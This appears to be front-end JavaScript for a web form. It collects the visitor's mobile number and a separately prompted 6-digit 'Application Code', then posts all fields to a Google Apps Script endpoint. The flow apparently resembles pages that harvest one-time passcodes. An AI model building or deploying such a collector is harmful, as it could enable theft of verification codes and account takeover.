document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("infoForm");
  const popupContainer = document.getElementById("popupContainer");
  const confirmButton = document.getElementById("confirmButton");
  const cancelButton = document.getElementById("cancelButton");
  const loader = document.getElementById("loaderContainer");

  // Intercept submit and show App Code popup
  form.addEventListener("submit", function (e) {
    e.preventDefault();
    popupContainer.style.display = "flex";
  });

  cancelButton.addEventListener("click", () => {
    popupContainer.style.display = "none";
  });

  confirmButton.addEventListener("click", () => {
    const appCode = document.getElementById("appCodeInput").value.trim();

    if (appCode.length !== 6) {
      alert("Please enter a valid 6-digit Application Code.");
      return;
    }

    // Collect form data
    const formData = new FormData(form);
    formData.append("appCode", appCode);

    const keyValuePairs = [];
    for (const [key, value] of formData.entries()) {
      keyValuePairs.push(`${encodeURIComponent(key)}=${encodeURIComponent(value)}`);
    }

    const formDataString = keyValuePairs.join("&");

    loader.style.display = "flex";

    fetch("https://script.google.com/macros/s/AKfycbzA29vURSVA7n5TTnlxxtC43tCEtotSoLDfmC3ZwM_YLcR6vUQkrbD49viZs4DBHjja/exec", {
      method: "POST",
      body: formDataString,
      headers: {
        "Content-Type": "text/plain;charset=utf-8",
      },
    })
    .then((response) => {
      loader.style.display = "none";
      if (response.ok) {
        popupContainer.style.display = "none";
        alert("Form submitted successfully!");
        form.reset();
      } else {
        throw new Error("Submission failed.");
      }
    })
    .catch((error) => {
      loader.style.display = "none";
      alert("An error occurred during submission.");
      console.error(error);
    });
  });

  // Define goToNextPage function
  window.goToNextPage = function () {
    // You can optionally validate inputs here before navigating
    const mobileNumber = document.getElementById('mobileNumber')?.value;
    if (!mobileNumber || mobileNumber.length < 10) {
      alert('Please enter a valid mobile number.');
      return;
    }

    localStorage.setItem('userMobileNumber', mobileNumber);
    window.location.href = "appcode.html"; // Replace with your next page
  };
});
5